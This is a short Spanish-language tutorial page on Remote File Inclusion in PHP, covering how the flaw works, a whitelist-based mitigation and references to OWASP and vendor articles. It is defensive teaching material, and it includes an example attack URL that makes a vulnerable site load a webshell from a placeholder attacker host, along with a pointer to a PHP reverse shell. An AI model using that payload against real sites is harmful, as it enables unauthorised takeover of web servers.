[Volver al inicio](../Readme.md)
# RFI (Remote File Inclusion)

## Introducción.
Debido a una posible aplicación multiservidor u otra razón, puede ocurrir que algunos sitios web permitan la inclusión de ficheros a través de la URL. Así pues, un actor malicioso puede intentar ejecutar un archivo que permita una conexión remota y que consiga la toma de control del sitio web. Veamos un ejemplo:

Dado el funcionamiento reflejado en la siguiente URL
`https://miweb.com?pagina=siguiente.php`

Un atacante puede publicar un servicio HTTP que tenga alojado una webshell creada en PHP (vease https://github.com/pentestmonkey/php-reverse-shell) y llamar a dicho servicio HTTP desde la URL del sitio vulnerable para que incluya la webshell:

```
https://miweb.com/?pagina=http://ip_atacante/webshell.php
```
Si la configuración del sitio web permite la inclusión mediante URL (parámetro **allow_url_include = on**, obsoleto a partir de PHP 7.4.0), entonces el ataque puede tener éxito y el atacante tomar el control.
## Mitigación de la vulnerabilidad RFI
La mejor forma de evitar esta vulnerabilidad es la de rechazar la carga de ficheros a través de la URL.
En caso de no poder prescindir de esta utilidad, deberíamos realizar una white list de las páginas que pueden ser cargadas y controlarlo en el código:


```php
<?php
    $file = $_GET['file']; 

    // Lista blanca de paginas validas
    switch ($file) {
        case 'principal':
        case 'acerca':
        case 'contacta':
            include '/home/wwwrun/include/'.$file.'.php';
            break;
        default:
            include '/home/wwwrun/include/main.php';
    }
?>
```

## Bibliografía.
- Muscat I. (02/04/2020). What is Remote File Inclusion (RFI)?. Acunetix. https://www.acunetix.com/blog/articles/remote-file-inclusion-rfi/
- OWASP WSTG - v4.2. (s.f.). Testing for Remote File Inclusion. OWASP. https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion
- Andrzej Nidecki T. (s.f.). Remote file inclusion (RFI). Invicti. https://www.invicti.com/learn/remote-file-inclusion-rfi/





